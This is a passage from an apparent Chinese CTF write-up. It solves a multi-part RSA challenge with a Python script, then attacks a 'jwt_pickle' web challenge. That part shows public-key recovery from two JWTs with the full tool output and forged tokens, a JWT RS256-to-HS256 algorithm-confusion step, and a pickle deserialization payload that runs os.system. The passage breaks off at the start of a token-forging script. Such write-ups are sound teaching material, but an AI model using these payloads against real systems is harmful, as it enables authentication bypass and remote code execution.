c:0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931</span><br><span class="line"></span><br><span class="line">cmp2</span><br><span class="line"></span><br><span class="line">p:0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3 q:0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f e:0xc051 c:0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12</span><br><span class="line"></span><br><span class="line">cmp3</span><br><span class="line"></span><br><span class="line">p:0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb q:0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509 e:0xd2c2 c:0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e</span><br></pre></td></tr></table></figure><p>解RSA：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">p1 = <span class="number">0xae1e96a501b0360bd9ca423f2d9366e7c01c56e2d02dd20effc4c290e8bbd2cc53bb2a65b5262e254418d706335708ebd713cf9fac04fb1209d666adc6ebb6fee8c97a8dde4c23d3704198f918de46fe69a0d4d7878341c25118e7d1ac368753ce45f77b64580e0a89e300ac8f1be75d3a001df26bcfdaf82a479e14f6f25bfb</span></span><br><span class="line">q1 = <span class="number">0xcfc337e9217545d01babb00c330747aed4e6d99df42892bffce38e9b5c8a89d0528a7daac8d0075d72813669bc332688c9f6df2793b393580ac71f05db159e2dee3a6fd34ca2ba5ccae8428efefd6ee5454b6751ca71c008468278d7fe911e8c292172fa77468e996d80f4661c24ccdcc76c655a9168b0edeed165b2dd89501b</span></span><br><span class="line">e1 = <span class="number">0xd322</span></span><br><span class="line">c1 = <span class="number">0x6f23dc633746ecd6f6b6c753556a969ded7f9033b7617d4497b3a3ac685b92063e42c5657a01604ed084035637440889bd6865449021a15dfa33ed2d9531f50c41d452df7399554a35f4340993d64c9e1c7b54894d291b33ac95b39719093d788a1d218f54f00494990f8aff3d09e21edae2172cd8b42ae6f8abfdb05e5d9a6ff4b5092f60f8ce2a576e429a80bd15fc7073d75415c824fc450a9295128e30804760179bc3213ade1121d615f7ebbf192f93dd25031de12e12e15ae189db525ddbdfb2f54f098c0a027b6b1277c22108dfd2699f7946ce51f1c73a78721896bd8baa3b7fa4dfc063ab212eb0684531f372f2edc7b1f7baa3353b55cc750b95ff</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="number">0x7a7b8ee72d467eefe378502ca7804e0b55e0b68987dd7e8c03f7f7f717554183d2a0d99c7b33e8e1a28be171b77f8974616ac49645d7d5cf6fe5f4dcbfd1d25c3ad75e1eb3e4038d55a29c7114e176fd34626c2a8e76021d079cdb85cc8016acab00047910dfa5cd0439a3cc13527557ea879c184454a443711083a4f9d1d46b</span></span><br><span class="line">q2 = <span class="number">0xc17c7a7fbc5469af413f79c07cc5b892cfbbaa00950b115e267e83e2669f3f6779c7302ecfc9f850e0e4185892e96d356d65b1d372432c5a3f297cfb8373fe9a090a3f8dadf6ef6f2ca5b5107454ee6b1385d165bb4bb7776cbbccb8de1993a5ebb34ee365ff39b9ec9613121ba99d74759e0bf80726805ce03ed7f1e49375f1</span></span><br><span class="line">e2 = <span class="number">0x10ae</span></span><br><span class="line">c2 = <span class="number">0x5be0df3bb240ffd53f2d914eb79878231821a1dba5cc491a888c8fd553a905a7f1cea2750c39ea48ab4175115591310c0f9d63e1aee9d2480780f3ce4f98c57114cd2901ea6f560e04a0a9cec157dac3def734fa10ab54c27bf20211cf1f1f6f6afe5fc9ef5c9af864f054a5e61c48c6e6dc087cc350008d4232d08b0b5011923f1077ead75d54a792aa8a51a0b37bfa3faef0b9380cff209c7bf3a20fbbb087caf177b83c9bf03e965bd7347dd18418f3e50aef29cc89fa594ccd31b6f63f397eeba71629fec2c8699148dfd6be32deb96577690814bb4fe6dbefe2379468e0e317a870795ba04ab2e306fe5340700c415048eff5909a2453752845572a0931</span></span><br><span class="line"></span><br><span class="line">p3 = <span class="number">0xa2562b53b1ff8b9635122c92612d8b6ea43ac0e40115c03befc0fb1bdefcda35a77f1cf23e5fdfa51ee864dac707524584cf4243cade36ea0b2ce14d9337d796f85b730483e7b6e342d44a36a1bc4052125b4eaef3724af9cfb8cab719d9efc54df851042408c2f69c1e5f46f00f067f7fa5cf7a3cb227879cbdefac7eab6cd3</span></span><br><span class="line">q3 = <span class="number">0xfeec12d4602e4895f53715d7e5a7583ee93c49079480aadae13c7c9d720a5fd976b6b9ac5ef65570f9e9d9b6d0b0b39f1372ea819bc14cc10a0a23a7f22f60c1a4fc536ebc4997bb873db9d8cb34f58fec2a05dc766cb865e09aa6c1a059713ccb1b31a9c986ecd4f45dc53c95e32ae6d370ee3566daa8b5f5bf6fe5fa20cd0f</span></span><br><span class="line">e3 = <span class="number">0xc051</span></span><br><span class="line">c3 = <span class="number">0xa798cb067b716ae1382d2070efb8bdb71050b88d9503a68fe5e851999071e4ee9f72c88b3975de09e8f436566d75f90e6388fddb3497b1e8f8f6bf8ad13cd35040d6b5b3f2e3ba3b1dddf14800840b0bfb08f25b5546cd5a34025e8eaaf289478c5f1b91229a31c980f773deb90cc0752da82aa17585bb616fc0b4f0749003a36f11acbdd4e85f7b092ee3864835c1063afccdbf3b585855a03e904cbc9c7fe9d86011a1237e396e4e2c72deec76829de7e67282cda86abd348bb98aac5ea83f3735c70a29f45cff6b4b76b03f12c4ea936368d13ba15a87da416a91be05ebaa0e67e1070e5d7a15f178c42ff05bab0e3de009f00b8e4cecf950f7250427e12</span></span><br><span class="line"></span><br><span class="line">p4 = <span class="number">0xb06c6c2ac320c555cc4bc5bc89976436582de33d77788ed0eb1e5b726e242c2890ede50d918d3b7cab74141519e43761f515590279fb4fa8674a94d0985aedfa4b54580307416aa1888015e12e2536350ffa418203161b5fb2438035160327e21f4015d4b7393d90fff50f8d5be3da08abefac23898a55dc60a24470c8fe76eb</span></span><br><span class="line">q4 = <span class="number">0xadabc61519e9642517eb5c2a4a416f34c62a2c1ea6ec4c1d0d4686a95c31dcabba2c13fa8217e14fc541857b846d88027a1f7cfee9aba0757c3a92ab579086586c0e52b8184de0c69ae674b034342b0db40955fbffdc84ee875b9b84f7d2bf32836f03c304b34fea2ea03731af95d9156b91a16ff9338fe8a9fce24525b65509</span></span><br><span class="line">e4 = <span class="number">0xd2c2</span></span><br><span class="line">c4 = <span class="number">0x11861752a8ca58b777300efbc8ed05ea54d0c326cbfb573a0bd21fe5a20191b03f07be7aea9ac192adbe48726a0a03ccc838375d7c4fcd0b8814578fad47ea0407281bbb205960c6453fff81584ce334a23960c6321c720da7b190281c6d46b55e3bab0493d8ff6cf3855a2a6039c259f955e2cbdfb9dcabc813ad82c5333d535950e28cfb2aa556c32700f64c2b63058cf33fe6c40677a93d8c80a0f9db60da1ce90182ed0aa6ed33a2a9288dc9ff19ed9bffb59991bddf282b38a59ded27f71c4e5e0190e5244d916556c033bb2a184c87cf1923fb87902fa9dbb5ad5f927249bedfa4b47e5a379297926e3216a808b93ea2c7bf014c0b7ae29eacf595a43e</span></span><br><span class="line"></span><br><span class="line">f1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">f2 = (p2-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">f3 = (p3-<span class="number">1</span>)*(q3-<span class="number">1</span>)</span><br><span class="line">f4 = (p4-<span class="number">1</span>)*(q4-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(gcd(e1,f1))</span><br><span class="line"><span class="built_in">print</span>(gcd(e2,f2))</span><br><span class="line"><span class="built_in">print</span>(gcd(e3,f3))</span><br><span class="line"><span class="built_in">print</span>(gcd(e4,f4))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line">d1 = inverse(e1//<span class="number">2</span>,f1)</span><br><span class="line">m1c = <span class="built_in">pow</span>(c1,d1,p1*q1)</span><br><span class="line">m1 = gmpy2.iroot(mpz(m1c),mpz(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">m1h = <span class="built_in">hex</span>(m1)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m1h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line">d2 = inverse(e2//<span class="number">2</span>,f2)</span><br><span class="line">m2c = <span class="built_in">pow</span>(c2,d2,p2*q2)</span><br><span class="line">m2 = gmpy2.iroot(mpz(m2c),mpz(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">m2h = <span class="built_in">hex</span>(m2)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m2h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line">d3 = inverse(e3//<span class="number">3</span>,f3)</span><br><span class="line">m3c = <span class="built_in">pow</span>(c3,d3,p3*q3)</span><br><span class="line">m3 = gmpy2.iroot(mpz(m3c),mpz(<span class="number">3</span>))[<span class="number">0</span>]</span><br><span class="line">m3h = <span class="built_in">hex</span>(m3)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m3h)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4</span></span><br><span class="line">d4 = inverse(e4//<span class="number">2</span>,f4)</span><br><span class="line">m4c = <span class="built_in">pow</span>(c4,d4,p4*q4)</span><br><span class="line">m4 = gmpy2.iroot(mpz(m4c),mpz(<span class="number">2</span>))[<span class="number">0</span>]</span><br><span class="line">m4h = <span class="built_in">hex</span>(m4)[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(m4h)</span><br><span class="line"></span><br><span class="line">flag = m1h+m2h+m3h+m4h</span><br><span class="line">h = md5(flag.encode()).hexdigest()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag&#123;&#123;<span class="subst">&#123;h&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 3</span></span><br><span class="line"><span class="comment"># 2</span></span><br><span class="line"><span class="comment"># 688682bc45a043f2e139153780fdd54af8517dd885464bdfa3dbcf776169255c</span></span><br><span class="line"><span class="comment"># 9304306d542508c59abf30f99b98fefcd2951df2effc81fca8e5aa26414819cb</span></span><br><span class="line"><span class="comment"># 144576b4302a8c5262d7d4d9b2ebb3468835c709cc88fc0b8b38b52a6f31d3ab</span></span><br><span class="line"><span class="comment"># 6b25edeccfcf74f0dfc77abc90d757a49c1d0fb1c90e67db7918c61be80ad59c</span></span><br><span class="line"><span class="comment"># flag&#123;d3f06717efc6c0daf454ffeac9764687&#125;</span></span><br></pre></td></tr></table></figure><p>​</p><h2 id="Crypto-Web"><a href="#Crypto-Web" class="headerlink" title="Crypto/Web"></a>Crypto/Web</h2><h3 id="jwt-pickle"><a href="#jwt-pickle" class="headerlink" title="jwt_pickle"></a>jwt_pickle</h3><blockquote><p>jwt和pickle,做就完事了OUO</p></blockquote><p>代码审计，发现jwt使用RS256加密，且使用RS256或HS256解密。</p><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18514445#web01">2024网鼎杯初赛-青龙组-WEB01</a></p><p>先生成两个token，然后利用rsa_sign2n工具来生成公钥：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_forgery.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFhYSIsInBhc3N3b3JkIjoiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCJpc19hZG1pbiI6ZmFsc2V9.esPiIzL35oWvFOGJeibCt7otZWE-83pVzGuljOE4O19amvZ2Y8zwgW71M-_CSVh_Wdiaz8RJaBKs-w_WCFSoEhEr7bToIDH5zeY38d8H4gkBpNGLhFWvhoRF5a-T0VrHS7JeTSJdyVgqpS7vF5o8pT3Q_fC13Hv4I-lMCYfeNhCe-SQnm9c86wVwF7i0KLY0vvi4CI9zx-iZWSzNHFmSpnXmQms8Tg9KoKO7Qq6SpccPbL4eJ5o52lSAjtohSeubVJcC_suXlNuB-odexWVozcuTRcAC-9uGUAWl7qZHc3TZffFOotggGONL5qSqpQJR5ST8KbCJkqk2hGnBpg9GSw eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImNjYyIsInBhc3N3b3JkIjoiNzc5NjNiN2E5MzEzNzdhZDRhYjVhZDZhOWNkNzE4YWEiLCJpc19hZG1pbiI6ZmFsc2V9.mJJbTtmHn_4dUKpaTEdETBdpFuTF7AggxptHdDuIPnD2FaIA1gX2Ys9PB5R4vLzi8MUTLB4Wufuoh2UCQnSzX0lVUx347ujgHUO_xrvPwkUAiZjoM4j5W7csJWMsSL-9T3AmHpRjJbHnXvmVzt_xQvOSBU1KUgkw2tyuwxPqjPJjkpKXIaialQmRL2ML3t2SdWiyPvPy9yo4BXQFRpFRLAA82C7OZN43wuoSSUVBvwnh6XnQXAoVugLxnFF7qFrxLDeb0b37K3_-ynMiU4FvLArGvgaWkQqvM2PdOEVpynvsM5SRGsrxvgJqo19aaSwjnttksRbfKLOJcKUFW3XwLg</span><br><span class="line">[*] GCD:  0x4</span><br><span class="line">[*] GCD:  0x2cdf3da1c5b0e166e522b8eee9feb75e98fe6a9e9bc0092cd81e32916cfee418321e21801d4b385b9361600765d21dde3e02a1a42734ebccad3194ed323cc09a4a78cccab401bb6139b3537871c649d8a0da4358e1f9e565ec5fcdd42c3660000755f53ff91a59dd7eb6ee9895cfcfd058826ac70353fe8fb55e65b62fa929bc3ea29998aff334a3c217053ab04120272b582e6692bb88bd23a3478e4462be43f8c39b3256e0d64399e51f0f0ea69c9726a6c91dae89e1b7c58f2655dcb291cccc862b13565dd5b844d3494a92e614fa90f07a66f8f10e19090bc76c6c954e82bc47afafd3df8384dcfd2d1fbfa8266923ea8b48c6b8f112df6d8e67420e076a4</span><br><span class="line">[+] Found n with multiplier 1  :</span><br><span class="line"> 0x2cdf3da1c5b0e166e522b8eee9feb75e98fe6a9e9bc0092cd81e32916cfee418321e21801d4b385b9361600765d21dde3e02a1a42734ebccad3194ed323cc09a4a78cccab401bb6139b3537871c649d8a0da4358e1f9e565ec5fcdd42c3660000755f53ff91a59dd7eb6ee9895cfcfd058826ac70353fe8fb55e65b62fa929bc3ea29998aff334a3c217053ab04120272b582e6692bb88bd23a3478e4462be43f8c39b3256e0d64399e51f0f0ea69c9726a6c91dae89e1b7c58f2655dcb291cccc862b13565dd5b844d3494a92e614fa90f07a66f8f10e19090bc76c6c954e82bc47afafd3df8384dcfd2d1fbfa8266923ea8b48c6b8f112df6d8e67420e076a4</span><br><span class="line">[+] Written to 2cdf3da1c5b0e166_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.Ay8GNWt_1llpI5Q8qPOt-wIs7c8AjxQZ85nc97Y0b8Y&#x27;</span></span><br><span class="line">[+] Written to 2cdf3da1c5b0e166_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.4lUi6OL8NIqdBeJ9y0s4BkV9-5twlf973KXfVuB0bXg&#x27;</span></span><br><span class="line">[+] Found n with multiplier 2  :</span><br><span class="line"> 0x166f9ed0e2d870b372915c7774ff5baf4c7f354f4de004966c0f1948b67f720c190f10c00ea59c2dc9b0b003b2e90eef1f0150d2139a75e65698ca76991e604d253c66655a00ddb09cd9a9bc38e324ec506d21ac70fcf2b2f62fe6ea161b300003aafa9ffc8d2ceebf5b774c4ae7e7e82c41356381a9ff47daaf32db17d494de1f514ccc57f99a51e10b829d5820901395ac1733495dc45e91d1a3c722315f21fc61cd992b706b21ccf28f8787534e4b9353648ed744f0dbe2c7932aee5948e666431589ab2eeadc2269a4a549730a7d48783d337c78870c8485e3b6364aa7415e23d7d7e9efc1c26e7e968fdfd4133491f545a4635c78896fb6c733a10703b52</span><br><span class="line">[+] Written to 166f9ed0e2d870b3_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.aApemXL-HmcakktrnGr1XaUpkfaMOp4oL919wO3MJy0&#x27;</span></span><br><span class="line">[+] Written to 166f9ed0e2d870b3_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.vJ1JdCFGV3vRkM1H3IF8wlFKaWVXcQbrHix3gHqvZMo&#x27;</span></span><br><span class="line">[+] Found n with multiplier 4  :</span><br><span class="line"> 0xb37cf68716c3859b948ae3bba7fadd7a63f9aa7a6f0024b36078ca45b3fb9060c8788600752ce16e4d85801d97487778f80a86909cd3af32b4c653b4c8f3026929e3332ad006ed84e6cd4de1c719276283690d6387e79597b17f3750b0d980001d57d4ffe4696775fadbba62573f3f416209ab1c0d4ffa3ed57996d8bea4a6f0fa8a6662bfccd28f085c14eac104809cad60b99a4aee22f48e8d1e39118af90fe30e6cc95b83590e67947c3c3a9a725c9a9b2476ba2786df163c995772ca47333218ac4d597756e1134d252a4b9853ea43c1e99be3c43864242f1db1b2553a0af11ebebf4f7e0e1373f4b47efea099a48faa2d231ae3c44b7db6399d08381da9</span><br><span class="line">[+] Written to b37cf68716c3859b_65537_x509.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.exHt20EJDDnCPtoF5H1WI80i5o7HmntbrISr9-wuZg4&#x27;</span></span><br><span class="line">[+] Written to b37cf68716c3859b_65537_pkcs1.pem</span><br><span class="line">[+] Tampered JWT: b<span class="string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.QejW2HaJAbmCgXQHkJxutQdYaSaFSeRnhKA3LKSyahY&#x27;</span></span><br><span class="line">================================================================================</span><br><span class="line">Here are your JWT<span class="string">&#x27;s once again for your copypasting pleasure</span></span><br><span class="line"><span class="string">================================================================================</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.Ay8GNWt_1llpI5Q8qPOt-wIs7c8AjxQZ85nc97Y0b8Y</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.4lUi6OL8NIqdBeJ9y0s4BkV9-5twlf973KXfVuB0bXg</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.aApemXL-HmcakktrnGr1XaUpkfaMOp4oL919wO3MJy0</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.vJ1JdCFGV3vRkM1H3IF8wlFKaWVXcQbrHix3gHqvZMo</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.exHt20EJDDnCPtoF5H1WI80i5o7HmntbrISr9-wuZg4</span></span><br><span class="line"><span class="string">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhYWEiLCAicGFzc3dvcmQiOiAiMDhmOGUwMjYwYzY0NDE4NTEwY2VmYjJiMDZlZWU1Y2QiLCAiaXNfYWRtaW4iOiBmYWxzZSwgImV4cCI6IDE3MzA2ODgxNjZ9.QejW2HaJAbmCgXQHkJxutQdYaSaFSeRnhKA3LKSyahY</span></span><br></pre></td></tr></table></figure><p>利用 <code>/admin</code> 回显尝试出公钥是 <code>b37cf68716c3859b_65537_pkcs1.pem</code>。</p><p><code>/admin</code> 路由可通过HS256解析，尝试修改RS256为HS256，先生成pickle：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="built_in">eval</span>,(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;sleep 5&#x27;)&quot;</span>,))</span><br><span class="line">poc = A()</span><br><span class="line">result = pickle.dumps(poc)</span><br><span class="line">result = base64.b64encode(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>再生成HS256的jwt：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 